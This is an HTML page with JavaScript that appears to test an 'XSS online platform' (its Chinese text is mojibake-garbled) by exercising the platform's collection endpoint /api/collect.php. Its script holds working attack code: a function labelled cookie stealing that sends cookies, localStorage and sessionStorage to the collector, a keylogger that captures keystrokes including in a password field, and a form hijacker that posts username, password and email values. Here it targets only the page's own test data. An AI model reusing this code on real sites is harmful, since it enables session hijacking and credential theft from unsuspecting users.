<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSSå¹³å°åŠŸèƒ½æµ‹è¯•é¡µé¢ - è“è²èŠ±XSSåœ¨çº¿å¹³å°</title>
    <link href="static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="static/libs/fontawesome/css/all.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #eee;
            min-height: 100vh;
            padding: 20px 0;
        }
        .test-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            transition: all 0.3s;
        }
        .test-card:hover {
            border-color: #00ff41;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
        }
        .status-badge {
            font-size: 12px;
            padding: 5px 10px;
            border-radius: 15px;
        }
        .success { background: #00ff41; color: #000; }
        .warning { background: #ffaa00; color: #000; }
        .error { background: #ff3b3b; color: #fff; }
        .pending { background: #888; color: #fff; }
        .code-block {
            background: #000;
            color: #00ff41;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            overflow-x: auto;
            margin: 10px 0;
        }
        .test-result {
            margin-top: 10px;
            padding: 10px;
            border-radius: 5px;
            background: rgba(0, 0, 0, 0.3);
        }
        h2 {
            color: #00ff41;
            margin-bottom: 20px;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
        }
        .btn-test {
            background: linear-gradient(135deg, #00ff41, #00d4ff);
            border: none;
            color: #000;
            font-weight: bold;
            padding: 10px 30px;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .btn-test:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 255, 65, 0.4);
        }
        .log-viewer {
            background: #000;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            max-height: 300px;
            overflow-y: auto;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="text-center mb-5">
            <h1 class="display-4" style="color: #00ff41;">ğŸ” XSSå¹³å°åŠŸèƒ½æµ‹è¯•é¡µé¢</h1>
            <p class="lead">å…¨é¢æµ‹è¯•è“è²èŠ±XSSåœ¨çº¿å¹³å°çš„æ•°æ®æ”¶é›†åŠŸèƒ½</p>
            <p class="text-warning">âš ï¸ æœ¬é¡µé¢ä»…ä¾›æµ‹è¯•ä½¿ç”¨ï¼Œè¯·å‹¿åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨</p>
        </div>

        <!-- æµ‹è¯•æ¦‚è§ˆ -->
        <div class="row mb-4">
            <div class="col-md-3">
                <div class="test-card text-center">
                    <h3><i class="fas fa-vial"></i></h3>
                    <h5>æµ‹è¯•é¡¹ç›®</h5>
                    <h2 id="totalTests">0</h2>
                </div>
            </div>
            <div class="col-md-3">
                <div class="test-card text-center">
                    <h3><i class="fas fa-check-circle text-success"></i></h3>
                    <h5>é€šè¿‡</h5>
                    <h2 id="passedTests" class="text-success">0</h2>
                </div>
            </div>
            <div class="col-md-3">
                <div class="test-card text-center">
                    <h3><i class="fas fa-times-circle text-danger"></i></h3>
                    <h5>å¤±è´¥</h5>
                    <h2 id="failedTests" class="text-danger">0</h2>
                </div>
            </div>
            <div class="col-md-3">
                <div class="test-card text-center">
                    <h3><i class="fas fa-clock text-warning"></i></h3>
                    <h5>å¾…æµ‹è¯•</h5>
                    <h2 id="pendingTests" class="text-warning">8</h2>
                </div>
            </div>
        </div>

        <!-- æµ‹è¯•1: APIè¿æ¥æµ‹è¯• -->
        <div class="test-card">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h4><i class="fas fa-plug"></i> æµ‹è¯•1: APIæ•°æ®æ”¶é›†æ¥å£è¿é€šæ€§</h4>
                    <p class="text-muted">æµ‹è¯• /api/collect æ¥å£æ˜¯å¦æ­£å¸¸å“åº”</p>
                </div>
                <span class="status-badge pending" id="status1">å¾…æµ‹è¯•</span>
            </div>
            <button class="btn btn-test mt-3" onclick="testAPI()">
                <i class="fas fa-play"></i> å¼€å§‹æµ‹è¯•
            </button>
            <div class="test-result" id="result1" style="display:none;"></div>
        </div>

        <!-- æµ‹è¯•2: Cookieçªƒå– -->
        <div class="test-card">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h4><i class="fas fa-cookie-bite"></i> æµ‹è¯•2: Cookieçªƒå–åŠŸèƒ½</h4>
                    <p class="text-muted">æµ‹è¯•Cookieã€localStorageã€sessionStorageæ•°æ®æ”¶é›†</p>
                </div>
                <span class="status-badge pending" id="status2">å¾…æµ‹è¯•</span>
            </div>
            <button class="btn btn-test mt-3" onclick="testCookieSteal()">
                <i class="fas fa-play"></i> å¼€å§‹æµ‹è¯•
            </button>
            <div class="test-result" id="result2" style="display:none;"></div>
        </div>

        <!-- æµ‹è¯•3: é”®ç›˜è®°å½• -->
        <div class="test-card">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h4><i class="fas fa-keyboard"></i> æµ‹è¯•3: é”®ç›˜è®°å½•åŠŸèƒ½</h4>
                    <p class="text-muted">æµ‹è¯•æŒ‰é”®æ•è·å’Œæ•°æ®ä¸ŠæŠ¥</p>
                </div>
                <span class="status-badge pending" id="status3">å¾…æµ‹è¯•</span>
            </div>
            <div class="mt-3">
                <input type="text" class="form-control mb-2" id="testInput" placeholder="åœ¨æ­¤è¾“å…¥æ–‡å­—æµ‹è¯•é”®ç›˜è®°å½•">
                <input type="password" class="form-control mb-2" id="testPassword" placeholder="æµ‹è¯•å¯†ç å­—æ®µæ•è·">
            </div>
            <button class="btn btn-test mt-3" onclick="testKeylogger()">
                <i class="fas fa-play"></i> å¼€å§‹æµ‹è¯•
            </button>
            <div class="test-result" id="result3" style="display:none;"></div>
        </div>

        <!-- æµ‹è¯•4: è¡¨å•åŠ«æŒ -->
        <div class="test-card">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h4><i class="fas fa-edit"></i> æµ‹è¯•4: è¡¨å•æ•°æ®åŠ«æŒ</h4>
                    <p class="text-muted">æµ‹è¯•è¡¨å•æäº¤æ‹¦æˆªåŠŸèƒ½</p>
                </div>
                <span class="status-badge pending" id="status4">å¾…æµ‹è¯•</span>
            </div>
            <form id="testForm" class="mt-3" onsubmit="return false;">
                <input type="text" class="form-control mb-2" name="username" placeholder="ç”¨æˆ·å">
                <input type="password" class="form-control mb-2" name="password" placeholder="å¯†ç ">
                <input type="email" class="form-control mb-2" name="email" placeholder="é‚®ç®±">
            </form>
            <button class="btn btn-test mt-3" onclick="testFormHijack()">
                <i class="fas fa-play"></i> å¼€å§‹æµ‹è¯•
            </button>
            <div class="test-result" id="result4" style="display:none;"></div>
        </div>

        <!-- æµ‹è¯•5: XHRè¯·æ±‚ -->
        <div class="test-card">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h4><i class="fas fa-exchange-alt"></i> æµ‹è¯•5: XMLHttpRequestæ•°æ®ä¼ è¾“</h4>
                    <p class="text-muted">æµ‹è¯•XHR POST/GETè¯·æ±‚æ•°æ®å‘é€</p>
                </div>
                <span class="status-badge pending" id="status5">å¾…æµ‹è¯•</span>
            </div>
            <button class="btn btn-test mt-3" onclick="testXHR()">
                <i class="fas fa-play"></i> å¼€å§‹æµ‹è¯•
            </button>
            <div class="test-result" id="result5" style="display:none;"></div>
        </div>

        <!-- æµ‹è¯•6: Fetch API -->
        <div class="test-card">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h4><i class="fas fa-satellite-dish"></i> æµ‹è¯•6: Fetch APIæ•°æ®ä¼ è¾“</h4>
                    <p class="text-muted">æµ‹è¯•ç°ä»£Fetch APIæ•°æ®å‘é€</p>
                </div>
                <span class="status-badge pending" id="status6">å¾…æµ‹è¯•</span>
            </div>
            <button class="btn btn-test mt-3" onclick="testFetch()">
                <i class="fas fa-play"></i> å¼€å§‹æµ‹è¯•
            </button>
            <div class="test-result" id="result6" style="display:none;"></div>
        </div>

        <!-- æµ‹è¯•7: è·¨åŸŸCORS -->
        <div class="test-card">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h4><i class="fas fa-globe"></i> æµ‹è¯•7: è·¨åŸŸCORSé…ç½®</h4>
                    <p class="text-muted">æµ‹è¯•è·¨åŸŸèµ„æºå…±äº«æ˜¯å¦æ­£ç¡®é…ç½®</p>
                </div>
                <span class="status-badge pending" id="status7">å¾…æµ‹è¯•</span>
            </div>
            <button class="btn btn-test mt-3" onclick="testCORS()">
                <i class="fas fa-play"></i> å¼€å§‹æµ‹è¯•
            </button>
            <div class="test-result" id="result7" style="display:none;"></div>
        </div>

        <!-- æµ‹è¯•8: å¤šç”¨æˆ·éš”ç¦» -->
        <div class="test-card">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h4><i class="fas fa-users"></i> æµ‹è¯•8: å¤šç”¨æˆ·æ•°æ®éš”ç¦»</h4>
                    <p class="text-muted">æµ‹è¯•ä¸åŒç”¨æˆ·IDçš„æ•°æ®éš”ç¦»åŠŸèƒ½</p>
                </div>
                <span class="status-badge pending" id="status8">å¾…æµ‹è¯•</span>
            </div>
            <button class="btn btn-test mt-3" onclick="testUserIsolation()">
                <i class="fas fa-play"></i> å¼€å§‹æµ‹è¯•
            </button>
            <div class="test-result" id="result8" style="display:none;"></div>
        </div>

        <!-- æµ‹è¯•æ—¥å¿— -->
        <div class="test-card">
            <h4><i class="fas fa-terminal"></i> æµ‹è¯•æ—¥å¿—</h4>
            <div class="log-viewer" id="logViewer">
                <div>[ç³»ç»Ÿ] æµ‹è¯•é¡µé¢å·²åŠ è½½ï¼Œå…±8ä¸ªæµ‹è¯•é¡¹ç›®</div>
                <div>[æç¤º] ç‚¹å‡»å„æµ‹è¯•é¡¹çš„"å¼€å§‹æµ‹è¯•"æŒ‰é’®è¿›è¡ŒåŠŸèƒ½éªŒè¯</div>
                <div>[æç¤º] æµ‹è¯•å®Œæˆåè¯·ç™»å½•åå°æŸ¥çœ‹æ•°æ®æ”¶é›†æƒ…å†µ</div>
            </div>
        </div>

        <!-- ä¸€é”®å…¨éƒ¨æµ‹è¯• -->
        <div class="text-center mt-4 mb-5">
            <button class="btn btn-test btn-lg" onclick="runAllTests()">
                <i class="fas fa-rocket"></i> ä¸€é”®è¿è¡Œå…¨éƒ¨æµ‹è¯•
            </button>
            <button class="btn btn-outline-light btn-lg ms-3" onclick="location.reload()">
                <i class="fas fa-redo"></i> é‡ç½®æµ‹è¯•
            </button>
        </div>
    </div>

    <script>
        // è®¾ç½®æµ‹è¯•Cookieå’Œå­˜å‚¨
        document.cookie = "test_cookie=xss_platform_test; path=/";
        localStorage.setItem('test_local', 'XSS Platform Test Data');
        sessionStorage.setItem('test_session', 'Session Test Data');

        // ç»Ÿè®¡å˜é‡
        let passed = 0;
        let failed = 0;
        let pending = 8;

        // æ—¥å¿—å‡½æ•°
        function log(message, type = 'info') {
            const logViewer = document.getElementById('logViewer');
            const time = new Date().toLocaleTimeString();
            const colors = {
                'info': '#0ff',
                'success': '#0f0',
                'error': '#f00',
                'warning': '#fa0'
            };
            const color = colors[type] || '#0ff';
            logViewer.innerHTML += `<div style="color: ${color}">[${time}] ${message}</div>`;
            logViewer.scrollTop = logViewer.scrollHeight;
        }

        // æ›´æ–°çŠ¶æ€
        function updateStatus(testNum, status, result) {
            const statusBadge = document.getElementById('status' + testNum);
            const resultDiv = document.getElementById('result' + testNum);
            
            if (status === 'success') {
                statusBadge.className = 'status-badge success';
                statusBadge.textContent = 'âœ“ é€šè¿‡';
                passed++;
                pending--;
                log(`æµ‹è¯•${testNum} - é€šè¿‡`, 'success');
            } else if (status === 'error') {
                statusBadge.className = 'status-badge error';
                statusBadge.textContent = 'âœ— å¤±è´¥';
                failed++;
                pending--;
                log(`æµ‹è¯•${testNum} - å¤±è´¥: ${result}`, 'error');
            }
            
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = result;
            
            document.getElementById('passedTests').textContent = passed;
            document.getElementById('failedTests').textContent = failed;
            document.getElementById('pendingTests').textContent = pending;
        }

        // æµ‹è¯•1: APIè¿æ¥
        async function testAPI() {
            log('å¼€å§‹æµ‹è¯•APIè¿æ¥...');
            try {
                const response = await fetch('/api/collect.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'test',
                        test_id: 1,
                        message: 'APIè¿æ¥æµ‹è¯•'
                    })
                });
                
                // æ£€æŸ¥å“åº”çŠ¶æ€
                if (!response.ok) {
                    const text = await response.text();
                    throw new Error(`HTTP ${response.status}: ${text.substring(0, 200)}`);
                }
                
                // æ£€æŸ¥å“åº”ç±»å‹
                const contentType = response.headers.get('content-type');
                if (!contentType || !contentType.includes('application/json')) {
                    const text = await response.text();
                    throw new Error(`å“åº”ä¸æ˜¯JSONæ ¼å¼: ${text.substring(0, 200)}`);
                }
                
                const data = await response.json();
                
                if (data.status === 'success') {
                    updateStatus(1, 'success', `<strong>âœ“ APIè¿æ¥æ­£å¸¸</strong><br>å“åº”: ${JSON.stringify(data)}<br>æ—¥å¿—ID: ${data.id}`);
                } else {
                    updateStatus(1, 'error', `APIè¿”å›é”™è¯¯: ${data.message}`);
                }
            } catch (error) {
                updateStatus(1, 'error', `è¿æ¥å¤±è´¥: ${error.message}<br><small>è¯·æ£€æŸ¥: <br>1. /api/collect æ–‡ä»¶æ˜¯å¦å­˜åœ¨<br>2. PHPæ˜¯å¦æ­£ç¡®é…ç½®<br>3. æ•°æ®åº“è¿æ¥æ˜¯å¦æ­£å¸¸</small>`);
            }
        }

        // æµ‹è¯•2: Cookieçªƒå–
        async function testCookieSteal() {
            log('å¼€å§‹æµ‹è¯•Cookieçªƒå–...');
            try {
                const cookieData = {
                    type: 'cookie_steal',
                    test_id: 2,
                    cookies: {
                        document: document.cookie,
                        localStorage: JSON.stringify(localStorage),
                        sessionStorage: JSON.stringify(sessionStorage)
                    },
                    url: window.location.href,
                    referrer: document.referrer
                };
                
                const response = await fetch('/api/collect.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(cookieData)
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const data = await response.json();
                
                if (data.status === 'success') {
                    updateStatus(2, 'success', `<strong>âœ“ Cookieæ•°æ®å·²æˆåŠŸå‘é€</strong><br>
                        Cookie: ${document.cookie.substring(0, 50)}...<br>
                        LocalStorage: ${Object.keys(localStorage).length}é¡¹<br>
                        SessionStorage: ${Object.keys(sessionStorage).length}é¡¹`);
                } else {
                    updateStatus(2, 'error', `å‘é€å¤±è´¥: ${data.message}`);
                }
            } catch (error) {
                updateStatus(2, 'error', `æµ‹è¯•å¤±è´¥: ${error.message}`);
            }
        }

        // æµ‹è¯•3: é”®ç›˜è®°å½•
        let keystrokes = [];
        let keyloggerActive = false;
        
        function testKeylogger() {
            if (keyloggerActive) {
                log('é”®ç›˜è®°å½•å·²åœ¨è¿è¡Œä¸­...', 'warning');
                return;
            }
            
            log('å¼€å§‹æµ‹è¯•é”®ç›˜è®°å½•...');
            log('è¯·åœ¨ä¸‹æ–¹è¾“å…¥æ¡†ä¸­è¾“å…¥è‡³å°‘5ä¸ªå­—ç¬¦...', 'warning');
            
            keyloggerActive = true;
            keystrokes = [];
            
            const input = document.getElementById('testInput');
            const password = document.getElementById('testPassword');
            
            // æ˜¾ç¤ºæç¤º
            const resultDiv = document.getElementById('result3');
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = '<div class="alert alert-info">âŒ¨ï¸ é”®ç›˜è®°å½•å·²æ¿€æ´»ï¼Œè¯·åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥è‡³å°‘5ä¸ªå­—ç¬¦...</div>';
            
            const keyHandler = async function(e) {
                keystrokes.push({
                    key: e.key,
                    code: e.code,
                    target: e.target.type,
                    time: new Date().toISOString()
                });
                
                // æ›´æ–°è¿›åº¦
                resultDiv.innerHTML = `<div class="alert alert-info">âŒ¨ï¸ å·²æ•è· ${keystrokes.length}/5 ä¸ªæŒ‰é”®...</div>`;
                
                if (keystrokes.length >= 5) {
                    try {
                        const response = await fetch('/api/collect.php', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                type: 'keylogger',
                                test_id: 3,
                                keystrokes: keystrokes
                            })
                        });
                        
                        const data = await response.json();
                        
                        if (data.status === 'success') {
                            updateStatus(3, 'success', `<strong>âœ“ é”®ç›˜è®°å½•åŠŸèƒ½æ­£å¸¸</strong><br>
                                å·²æ•è·${keystrokes.length}ä¸ªæŒ‰é”®<br>
                                æ•°æ®å·²æˆåŠŸä¸ŠæŠ¥åˆ°æœåŠ¡å™¨`);
                            input.removeEventListener('keydown', keyHandler);
                            password.removeEventListener('keydown', keyHandler);
                            keyloggerActive = false;
                        }
                    } catch (error) {
                        updateStatus(3, 'error', `ä¸ŠæŠ¥å¤±è´¥: ${error.message}`);
                        input.removeEventListener('keydown', keyHandler);
                        password.removeEventListener('keydown', keyHandler);
                        keyloggerActive = false;
                    }
                }
            };
            
            input.addEventListener('keydown', keyHandler);
            password.addEventListener('keydown', keyHandler);
            
            input.focus();
        }

        // æµ‹è¯•4: è¡¨å•åŠ«æŒ
        async function testFormHijack() {
            log('å¼€å§‹æµ‹è¯•è¡¨å•åŠ«æŒ...');
            
            const form = document.getElementById('testForm');
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            try {
                const response = await fetch('/api/collect.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'form_hijack',
                        test_id: 4,
                        formData: data,
                        action: form.action,
                        method: form.method
                    })
                });
                
                const result = await response.json();
                
                if (result.status === 'success') {
                    updateStatus(4, 'success', `<strong>âœ“ è¡¨å•æ•°æ®åŠ«æŒæˆåŠŸ</strong><br>
                        æ•è·å­—æ®µ: ${Object.keys(data).join(', ')}<br>
                        æ•°æ®å·²æˆåŠŸå‘é€`);
                } else {
                    updateStatus(4, 'error', `å‘é€å¤±è´¥: ${result.message}`);
                }
            } catch (error) {
                updateStatus(4, 'error', `æµ‹è¯•å¤±è´¥: ${error.message}`);
            }
        }

        // æµ‹è¯•5: XHR
        function testXHR() {
            log('å¼€å§‹æµ‹è¯•XHRæ•°æ®ä¼ è¾“...');
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/api/collect.php', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        const data = JSON.parse(xhr.responseText);
                        if (data.status === 'success') {
                            updateStatus(5, 'success', `<strong>âœ“ XHRä¼ è¾“æ­£å¸¸</strong><br>
                                è¯·æ±‚æ–¹æ³•: POST<br>
                                å“åº”çŠ¶æ€: ${xhr.status}<br>
                                æ•°æ®å·²æ¥æ”¶`);
                        } else {
                            updateStatus(5, 'error', `XHRè¿”å›é”™è¯¯: ${data.message}`);
                        }
                    } else {
                        updateStatus(5, 'error', `HTTPé”™è¯¯: ${xhr.status}`);
                    }
                }
            };
            
            xhr.send(JSON.stringify({
                type: 'xhr_test',
                test_id: 5,
                method: 'XMLHttpRequest',
                userAgent: navigator.userAgent
            }));
        }

        // æµ‹è¯•6: Fetch API
        async function testFetch() {
            log('å¼€å§‹æµ‹è¯•Fetch API...');
            
            try {
                const response = await fetch('/api/collect.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'fetch_test',
                        test_id: 6,
                        method: 'Fetch API',
                        browser: {
                            language: navigator.language,
                            platform: navigator.platform,
                            cookieEnabled: navigator.cookieEnabled
                        }
                    })
                });
                
                if (response.ok) {
                    const data = await response.json();
                    if (data.status === 'success') {
                        updateStatus(6, 'success', `<strong>âœ“ Fetch APIå·¥ä½œæ­£å¸¸</strong><br>
                            å“åº”çŠ¶æ€: ${response.status}<br>
                            æ•°æ®å·²æˆåŠŸæ¥æ”¶`);
                    } else {
                        updateStatus(6, 'error', `Fetchè¿”å›é”™è¯¯: ${data.message}`);
                    }
                } else {
                    updateStatus(6, 'error', `HTTPé”™è¯¯: ${response.status}`);
                }
            } catch (error) {
                updateStatus(6, 'error', `Fetchå¤±è´¥: ${error.message}`);
            }
        }

        // æµ‹è¯•7: CORS
        async function testCORS() {
            log('å¼€å§‹æµ‹è¯•CORSé…ç½®...');
            
            try {
                const response = await fetch('/api/collect.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify({
                        type: 'cors_test',
                        test_id: 7,
                        origin: window.location.origin
                    })
                });
                
                const corsHeaders = {
                    'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                    'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods'),
                    'Access-Control-Allow-Headers': response.headers.get('Access-Control-Allow-Headers')
                };
                
                if (response.ok) {
                    updateStatus(7, 'success', `<strong>âœ“ CORSé…ç½®æ­£ç¡®</strong><br>
                        Allow-Origin: ${corsHeaders['Access-Control-Allow-Origin']}<br>
                        Allow-Methods: ${corsHeaders['Access-Control-Allow-Methods']}<br>
                        è·¨åŸŸè¯·æ±‚å¯æ­£å¸¸å·¥ä½œ`);
                } else {
                    updateStatus(7, 'error', `CORSæµ‹è¯•å¤±è´¥: ${response.status}`);
                }
            } catch (error) {
                updateStatus(7, 'error', `CORSæµ‹è¯•å¤±è´¥: ${error.message}`);
            }
        }

        // æµ‹è¯•8: å¤šç”¨æˆ·éš”ç¦»
        async function testUserIsolation() {
            log('å¼€å§‹æµ‹è¯•å¤šç”¨æˆ·æ•°æ®éš”ç¦»...');
            
            try {
                // æµ‹è¯•ç”¨æˆ·1
                const user1Response = await fetch('/api/collect.php?uid=1', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'user_test',
                        test_id: 8,
                        user: 'user1',
                        data: 'User 1 Data'
                    })
                });
                
                // æ£€æŸ¥å“åº”çŠ¶æ€
                if (!user1Response.ok) {
                    throw new Error(`ç”¨æˆ·1è¯·æ±‚å¤±è´¥: HTTP ${user1Response.status}`);
                }
                
                const contentType1 = user1Response.headers.get('content-type');
                if (!contentType1 || !contentType1.includes('application/json')) {
                    const text1 = await user1Response.text();
                    throw new Error(`ç”¨æˆ·1å“åº”ä¸æ˜¯JSON: ${text1.substring(0, 100)}`);
                }
                
                // æµ‹è¯•ç”¨æˆ·2
                const user2Response = await fetch('/api/collect.php?uid=2', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'user_test',
                        test_id: 8,
                        user: 'user2',
                        data: 'User 2 Data'
                    })
                });
                
                // æ£€æŸ¥å“åº”çŠ¶æ€
                if (!user2Response.ok) {
                    throw new Error(`ç”¨æˆ·2è¯·æ±‚å¤±è´¥: HTTP ${user2Response.status}`);
                }
                
                const contentType2 = user2Response.headers.get('content-type');
                if (!contentType2 || !contentType2.includes('application/json')) {
                    const text2 = await user2Response.text();
                    throw new Error(`ç”¨æˆ·2å“åº”ä¸æ˜¯JSON: ${text2.substring(0, 100)}`);
                }
                
                const data1 = await user1Response.json();
                const data2 = await user2Response.json();
                
                if (data1.status === 'success' && data2.status === 'success') {
                    updateStatus(8, 'success', `<strong>âœ“ å¤šç”¨æˆ·éš”ç¦»åŠŸèƒ½æ­£å¸¸</strong><br>
                        ç”¨æˆ·1æ•°æ®ID: ${data1.id}<br>
                        ç”¨æˆ·2æ•°æ®ID: ${data2.id}<br>
                        æ•°æ®å·²æŒ‰ç”¨æˆ·IDåˆ†åˆ«å­˜å‚¨`);
                } else {
                    updateStatus(8, 'error', 'ç”¨æˆ·éš”ç¦»æµ‹è¯•å¤±è´¥');
                }
            } catch (error) {
                updateStatus(8, 'error', `æµ‹è¯•å¤±è´¥: ${error.message}`);
            }
        }

        // ä¸€é”®è¿è¡Œå…¨éƒ¨æµ‹è¯•
        async function runAllTests() {
            log('å¼€å§‹è¿è¡Œå…¨éƒ¨æµ‹è¯•...', 'warning');
            
            await testAPI();
            await new Promise(r => setTimeout(r, 500));
            
            await testCookieSteal();
            await new Promise(r => setTimeout(r, 500));
            
            await testXHR();
            await new Promise(r => setTimeout(r, 500));
            
            await testFetch();
            await new Promise(r => setTimeout(r, 500));
            
            await testCORS();
            await new Promise(r => setTimeout(r, 500));
            
            await testUserIsolation();
            await new Promise(r => setTimeout(r, 500));
            
            await testFormHijack();
            await new Promise(r => setTimeout(r, 500));
            
            log('æç¤º: é”®ç›˜è®°å½•æµ‹è¯•éœ€è¦æ‰‹åŠ¨è¾“å…¥', 'warning');
            log('å…¨éƒ¨è‡ªåŠ¨æµ‹è¯•å®Œæˆï¼', 'success');
        }

        // åˆå§‹åŒ–
        document.getElementById('totalTests').textContent = '8';
        log('[ç³»ç»Ÿ] æµ‹è¯•ç¯å¢ƒå·²å°±ç»ª');
        log('[æç¤º] å¯ä»¥å¼€å§‹è¿è¡Œæµ‹è¯•');
    </script>
</body>
</html>
